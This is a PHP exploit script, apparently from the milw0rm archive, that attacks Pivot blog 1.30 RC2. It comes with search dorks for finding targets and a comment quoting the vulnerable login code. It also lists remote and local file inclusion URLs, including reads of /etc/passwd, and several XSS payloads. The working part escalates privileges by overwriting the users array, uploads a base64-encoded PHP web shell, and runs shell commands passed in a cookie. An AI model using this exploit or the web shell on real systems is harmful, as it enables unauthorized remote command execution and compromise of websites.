@@ -1,0 +1,281 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "Pivot <= 1.30 RC2 privileges escalation / remote commands execution exploit\n";
+echo "by rgod rgod@autistici.org\n";
+echo "site: http://retrogod.altervista.org\n";
+echo "dorks: \"Powered byPivot\"\n";
+echo "version specific: \"Powered byPivot - 1.30 RC2\" +Rippersnapper\n\n";
+/*
+works with register_globals=On
+*/
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path cmd OPTIONS\n";
+echo "host:       target server (ip/hostname)\n";
+echo "path:       path to the blog\n";
+echo "cmd:        a shell command\n";
+echo "Options:\n";
+echo "   -p[port]:    specify a port other than 80\n";
+echo "   -P[ip:port]: specify a proxy\n";
+echo "Examples:\n";
+echo "php ".$argv[0]." localhost /blog/ ls -la -p81\n";
+echo "php ".$argv[0]." localhost /blog/ ls -la -P1.1.1.1:80\n\n";
+die;
+}
+
+/* software site: http://www.pivotlog.net/
+
+  i) vulnerable code in pv_core.php at line 23-24 and in CheckLogin() function:
+
+  ...
+  // some global initialisation stuff
+  $Pivot_Vars = array_merge($_GET , $_POST, $_SERVER);
+
+  ...
+   function CheckLogin() {
+	global $Users, $Pivot_Vars, $Cfg;
+	// User is banned..
+	if(isset($Cfg['bn_' . $_SERVER['REMOTE_ADDR']])){
+		Login(1, 1, "User is banned");
+	}
+
+	// added to not check for referers if no session id is given..
+	if(!isset($Pivot_Vars['session'])){                                                    <-------------[!]
+		$uri = 'http://' . $Pivot_Vars['HTTP_HOST'] . $Pivot_Vars['SCRIPT_NAME'];
+		if(strpos($Pivot_Vars['HTTP_REFERER'], $uri)!=0){
+			$Pivot_Vars['user'] = '';
+			Login(0, 2, "No session active.");
+		}
+	}
+
+	// If we selected logout from the menu..
+	if( isset($Pivot_Vars['func']) && ($Pivot_Vars['func'] == 'login') && isset($Pivot_Vars['do']) && ($Pivot_Vars['do'] == 'logout')){
+
+		setcookie('user', '', -9999,"/");
+		setcookie('pass', '', -9999,"/");
+		setcookie('mode', 'nothing', -9999,"/");
+		unset($Users[$Cfg['tempsessions'][$Pivot_Vars['session']][0]]['session']);
+		unset($Cfg['tempsessions'][$Pivot_Vars['session']]);
+
+		SaveSettings();
+		login(0,3, "User logged off");
+	}
+
+	// if the user has cookies set, but no session is active yet..
+	if( isset($_COOKIE['user']) && isset($_COOKIE['hash']) && ($_COOKIE['mode'] == 'stayloggedin') &&        <----------- [!!!]
+		( (!isset($Pivot_Vars['session'])) || ($Pivot_Vars['session'] == "")) ) {
+
+		debug("attempted ReviveSession..");
+		// Try to revive an old Session..
+		ReviveSession();
+
+	} else if(($Pivot_Vars['func'] == 'login') || ($Pivot_Vars['do'] == 'login')) {
+
+		// if we've just logged in, reset the cookies, if necesary and start a new session..
+
+		debug("attempted login..");
+		if ( ($Users[$Pivot_Vars['user']]['pass'] == md5($Pivot_Vars['pass']))                           <-------------- [!!!!]
+				&& ($Users[$Pivot_Vars['user']]['userlevel']>0) ) {
+
+			NewSession($Pivot_Vars['user']);
+
+		}else{
+
+			// add one to the failed login attempts.
+			if(strlen($Pivot_Vars['user']) > 0) {
+				$Cfg['fl_' . $_SERVER['REMOTE_ADDR']]++;
+			}
+			echo "merda, sono qua 4\r\n";
+			Login(1,4, "Incorrect username or password");
+
+		}
+
+	} else {
+		// when running normally, the session stuff is updated.
+
+		$Pivot_Vars['user'] = $Cfg['tempsessions'][$Pivot_Vars['session']][0];
+
+		$ip = substr( $_SERVER['REMOTE_ADDR'], 0, strrpos( $_SERVER['REMOTE_ADDR'], "."));
+
+		// calculated locally: user's pass + current session + ip we got from user
+		$hash1 = md5( md5( $Users[$Pivot_Vars['user']]['pass'] . $Pivot_Vars['session'] ) . $ip ) ;
+
+		// stored hash
+		$hash2 = $Cfg['tempsessions'][$Pivot_Vars['session']][1];
+
+		// we check if the two hash matches with the one that was stored
+		if ($hash1 != $hash2) {
+
+			// if this is the case, something's not ok, so go back to login..
+			Login(0,0, "No hacking, please");
+
+		}
+	}
+
+	// If by this point no session is set, we will show the login screen..
+	if(strlen($Pivot_Vars['session']) == 0) {
+		Login(0,8, "Please log on. (if you keep getting this message, delete the cookies for this site)");
+	}
+
+	// Update the timer, so we can keep the user logged in.
+	if($Cfg['tempsessions'][$Pivot_Vars['session']][2] - time() <= ($Cfg['session_length'] / 4)) {
+		$Cfg['tempsessions'][$Pivot_Vars['session']][2] = $Cfg['tempsessions'][$Pivot_Vars['session']][2] + $Cfg['session_length'];
+
+	}
+}
+...
+
+a remote user can overwrite $Pivot_Vars array and, if register_globals=on,
+$Users one, to escalate privileges, then he can upload php files in images/ folder
+through the includes/editor/insert_image.php script
+
+ii)
+arbitrary remote inclusion (on php5) with register_globals=On
+http://[target]/pivot/includes/edit_new.php?Paths[extensions_path]=ftp://username:password@somehost.com/
+
+where on somehost.com we have a
+hooks/pre_editor_normal.php with some shellcode inside
+
+and local inclusion with register_globals=On & magic_quotes_gpc=Off
+http://[target]/pivot/includes/edit_new.php?Paths[extensions_path]=/etc/passwd%00
+
+iii) various xss with register_globals=On:
+
+http://[target]/[path]/pivot/includes/blogroll.php?fg=[XSS]
+http://[target]/[path]/pivot/includes/blogroll.php?line1=[XSS]
+http://[target]/[path]/pivot/includes/blogroll.php?line2=[XSS]
+http://[target]/[path]/pivot/includes/blogroll.php?bg=[XSS]
+http://[target]/[path]/pivot/includes/blogroll.php?c1=[XSS]
+http://[target]/[path]/pivot/includes/blogroll.php?c2=[XSS]
+http://[target]/[path]/pivot/includes/blogroll.php?c3=[XSS]
+http://[target]/[path]/pivot/includes/blogroll.php?c4=[XSS]
+http://[target]/[path]/pivot/includes/editor/edit_menu.php?name=[XSS]
+http://[target]/[path]/pivot/includes/editor/edit_menu.php?js_name=[XSS]
+
+iv) regardless of magic_quotes_gpc, xss:
+http://[target]/[path]/pivot/includes/photo.php?h=><script>alert(document.cookie)</script>
+http://[target]/[path]/pivot/includes/photo.php?w=><script>alert(document.cookie)</script>
+
+this is the poc exploit tool for i)
+									      */
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+$port=80;
+$proxy="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$magic_var="suntzu"; //no matter how you call him
+$shell="error_reporting(0);if(get_magic_quotes_gpc()){\$_COOKIE[\"cmd\"]=stripslashes(\$_COOKIE[\"cmd\"]);}set_time_limit(0);echo \"my_delim\";passthru(\$_COOKIE[\"cmd\"]);echo \"my_delim\";";
+$shell=base64_encode($shell);
+$data='-----------------------------7d62702f250530
+Content-Disposition: form-data; name="userfile"; filename="cfg.php";
+Content-Type: text/plain
+
+<?php;eval(base64_decode("'.$shell.'"));?>
+-----------------------------7d62702f250530--
+';
+$packet="POST ".$p."pivot/includes/editor/insert_image.php?session=".$magic_var."&func=login&pass=".$magic_var."&user=".$magic_var."&Users[".$magic_var."][pass]=".md5($magic_var)."&Users[".$magic_var."][userlevel]=1 HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Cookie: hash=; mode=stayloggedin; user=;\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+//shell.php is renamed to shell.php.php
+$packet="GET ".$p."images/cfg.php.php HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"my_delim"))
+ {
+  $temp=explode("my_delim",$html);
+  die("exploit succeeded...\n\n".$temp[1]);
+ }
+//if you are here...
+echo "exploit failed...";
+?>
+
+# milw0rm.com [2006-07-07]
